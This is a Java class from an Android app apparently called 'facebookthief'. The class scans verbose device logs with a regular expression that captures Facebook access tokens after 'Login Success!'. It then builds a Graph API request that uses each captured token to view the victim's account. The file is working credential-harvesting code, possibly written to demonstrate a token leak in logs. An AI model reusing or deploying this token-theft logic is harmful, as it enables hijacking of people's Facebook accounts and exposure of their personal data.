package com.pixplicity.facebookthief;

import java.io.Serializable;

import android.content.Intent;
import android.net.Uri;

public class LogResult implements Serializable {

	private static final long serialVersionUID = 2810266560538018564L;

	public final String line;
	public final String interest;

	public LogResult(String line, String interest) {
		this.line = line;
		this.interest = interest;
	}

	/**
	 * Returns regular expression for finding log matches
	 * 
	 * @return regular expression
	 */
	public static String getRegEx() {
		return "Login Success! access_token=([^&\\s]+)";
	}

	/**
	 * Returns an intent when interacting with this result.
	 * 
	 * @return intent
	 */
	public Intent getIntent() {
		if (interest == null) {
			return null;
		}
		// Show the Facebook graph result for this access token
		return new Intent(Intent.ACTION_VIEW,
				Uri.parse("https://graph.facebook.com/me?access_token="
						+ interest));
	}

	/**
	 * Returns the desired minimum {@link LogVerbosity}.
	 * 
	 * @return log verbosity
	 */
	public static LogVerbosity getVerbosity() {
		return LogVerbosity.V;
	}

}
